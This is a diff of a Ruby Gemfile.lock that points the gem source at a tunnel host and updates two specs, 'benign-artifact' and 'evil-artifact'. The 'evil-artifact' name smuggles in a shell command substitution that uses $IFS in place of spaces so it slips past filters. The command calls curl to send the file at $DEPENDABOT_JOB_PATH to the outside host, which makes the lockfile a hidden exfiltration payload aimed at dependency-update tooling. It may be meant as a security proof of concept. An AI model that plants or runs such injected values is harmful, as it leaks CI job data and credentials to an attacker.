@@ -1,8 +1,8 @@
 GEM
-  remote: https://boats-maker-alien-airports.trycloudflare.com/reg
+  remote: https://boats-maker-alien-airports.trycloudflare.com/reg/
   specs:
-    benign-artifact (1.0.0)
-    evil-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@$DEPENDABOT_JOB_PATH$IFS$()boats-maker-alien-airports.trycloudflare.com) (1.0.0)
+    benign-artifact (1.1.0)
+    evil-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@$DEPENDABOT_JOB_PATH$IFS$()boats-maker-alien-airports.trycloudflare.com) (1.1.0)
 
 PLATFORMS
   ruby
